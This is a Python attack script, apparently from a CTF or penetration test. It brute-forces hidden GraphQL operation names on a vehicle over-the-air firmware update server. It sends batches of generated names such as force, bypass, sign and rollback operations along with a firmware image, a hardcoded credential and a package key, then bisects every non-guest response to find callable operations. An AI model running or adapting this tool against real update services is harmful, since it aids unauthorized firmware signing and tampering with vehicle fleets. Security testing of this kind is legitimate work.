#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Stage O: exhaustive operation inventory of the /graphql matcher.

Shotgun method (validated): the matcher is a substring test on the query text and
a 20 KB query still dispatches, so ~50 names per request covers thousands.
Generate verb+noun AND noun+verb, plus 3-part names, and report every name that
does not return the guest fallback.
"""
import base64, hashlib, json, os
import requests
from concurrent.futures import ThreadPoolExecutor

HERE = os.path.dirname(os.path.abspath(__file__))
EV = os.path.abspath(os.path.join(HERE, "..", "..", "03_EVIDENCE", "sign"))
URL = "http://10.225.139.2:8080/graphql"
VIN = "CV622697F82A936A1"
CAMP = "CAMP-243892C376D4CB2D5F826953"
CRED = "5e7f07b4a81153ecd5868cc02557f823"
PKG = "3ac02bb40567fa14062cc768e22fefac3dd972aee87a3bf2d01419f026d573d0"
FW = open(os.path.join(HERE, "..", "..", "work", "bundle2", "x", "vcu-reference.bin"), "rb").read()
SHA = hashlib.sha256(FW).hexdigest()
B64 = base64.b64encode(FW).decode()
GUEST = '{"data":{"vehicles":[{"label":"Guest demo vehicle","vin":"CV6000000DEMO0001"}]}}'

VERBS = """get list read fetch query find lookup load view show describe inspect dump
create add new register provision enroll generate mint issue init begin start open
prepare setup ready stage draft build make compose construct form pack wrap bundle
update set modify patch edit change assign attach apply install mount upload push
delete remove revoke cancel abort drop clear reset purge
validate verify check confirm assert ensure test probe
authenticate authorize authorise approve accept reject deny refuse
commit finalize finalise complete close finish seal sign countersign cosign endorse
activate deactivate enable disable publish release promote rollout deploy ship
submit send post put deliver transfer download export import
rollback revert restore undo force override bypass skip
mark flag tag label bind unbind link unlink associate attach2
count increment decrement bump next advance step progress
request request2 ask apply2 claim acquire obtain receive accept2
parse decode read2 open2 unlock lock
""".split()
NOUNS = """Vehicle Vehicles VehicleUpdate VehicleCampaign
Campaign Campaigns UpdateCampaign CampaignUpdate CampaignState CampaignStatus
Firmware FirmwareUpdate UpdateFirmware FirmwareImage FirmwarePackage FirmwareSignature
FirmwareSign FirmwareAssignment FirmwareCampaign FirmwareRelease
Update Updates UpdateRequest UpdatePackage UpdateSignature UpdateCampaignState
Ota OtaUpdate OtaCampaign OtaPackage OtaSignature OtaRelease OtaBundle
Vcu VcuUpdate VcuFirmware VcuReference VcuPackage VcuSignature VcuCampaign
Package Packages Artifact Artifacts Image Images Bundle Bundles
Signature Signatures Signing SigningRequest SignatureRequest
Authorization Authorizations AuthorizedUpdate
Credential Credentials Token Tokens Ticket Tickets Key Keys PublicKey
Objective Objectives Final Flag Flags
Diagnostic Diagnostics Manifest Manifests
Rollback RollbackCounter Slot Slots Generation Generations
Release Releases Software Ecu Ecus Fleet Engineering
Task Tasks Job Jobs Status State Phase Stage Step
Session Sessions Nonce Challenge Proof Attestation Quote
CampaignRollback UpdateRollback Reference Signed SignedUpdate
""".split()

NAMES = set()
for v in VERBS:
    for n in NOUNS:
        if v.endswith("2"):
            v = v[:-1]
        NAMES.add(v + n)
        NAMES.add(n[0].lower() + n[1:] + v[0].upper() + v[1:])
for n in NOUNS:
    NAMES.add(n)
for v in VERBS:
    if not v.endswith("2"):
        NAMES.add(v)
# hand-picked 3-part and domain phrases
NAMES |= set("""
signFirmwareUpdate assignFirmwareUpdate countersignFirmwareUpdate
createFirmwareUpdate prepareFirmwareUpdate openFirmwareUpdate
initFirmwareUpdate registerFirmwareUpdate validateFirmwareUpdate
approveFirmwareUpdate commitFirmwareUpdate finalizeFirmwareUpdate
vehicleDiagnostics prepareUpdateCampaign createUpdateCampaign
openUpdateCampaign validateUpdateCampaign approveUpdateCampaign
getUpdateCampaign updateCampaignStatus campaignRollbackCounter
vehicleCampaignRollback vehicleUpdateCampaign otaUpdateCampaign
createVehicleUpdate assignVehicleUpdate signVehicleUpdate
""".split())
NAMES = sorted(n for n in NAMES if n and len(n) > 3)
print(f"[*] {len(NAMES)} names")

VARS = {"vin": VIN, "campaignId": CAMP, "campaign": CAMP, "rollback": 2,
        "rollbackCounter": 2, "firmware": B64, "firmwareBase64": B64,
        "firmwareHex": FW.hex(), "sha256": SHA, "digest": SHA, "hash": SHA,
        "firmwareSha256": SHA, "size": 1024, "length": 1024, "address": "0x08040000",
        "updateAddress": "0x08040000", "vcuUpdateAddress": "0x08040000",
        "packageKey": PKG, "firmwareCredential": CRED, "credential": CRED,
        "vcuReference": B64, "image": B64, "payload": B64, "data": B64,
        "reference": B64, "vcuRollback": 2, "vcuReferenceSize": 1024,
        "vehicleId": VIN, "targetVin": VIN, "slot": "vcu",
        "signature": SHA, "sig": SHA, "signed": True, "sign": True,
        "authorize": True, "commit": True, "force": True, "type": "ECDSA-P256",
        "alg": "ECDSA-P256", "curve": "P-256", "hashAlg": "SHA-256",
        "nonce": "nGYWxAUXYNV3Jwe9", "id": CAMP, "updateId": CAMP}


def post(q, v):
    r = requests.post(URL, json={"query": q, "variables": v}, timeout=15)
    return r.status_code, r.text.strip()


def chunk(l, n):
    for i in range(0, len(l), n):
        yield l[i:i + n]


def main():
    jobs = list(chunk(NAMES, 45))
    print(f"[*] {len(jobs)} requests")

    def run(ch):
        st, txt = post(" ".join(ch), VARS)
        return {"chunk": ch, "status": st, "guest": txt == GUEST, "resp": txt[:400]}

    with ThreadPoolExecutor(max_workers=8) as ex:
        res = list(ex.map(run, jobs))
    json.dump(res, open(os.path.join(EV, "O_inventory.json"), "w"), indent=1)
    bad = [r for r in res if not r["guest"]]
    print(f"[*] non-guest chunks: {len(bad)}")
    found = {}
    for r in bad:
        cand = r["chunk"]
        while len(cand) > 1:
            mid = len(cand) // 2
            a, b = cand[:mid], cand[mid:]
            cand = a if post(" ".join(a), VARS)[1] != GUEST else b
        st, txt = post(cand[0], VARS)
        if cand[0] not in found:
            found[cand[0]] = txt[:300]
            print(f"  >>> {cand[0]:30s} {st} {txt[:160]}")
    json.dump(found, open(os.path.join(EV, "O_inventory_hits.json"), "w"), indent=1)
    print("[*] distinct ops:", sorted(found))


if __name__ == "__main__":
    main()
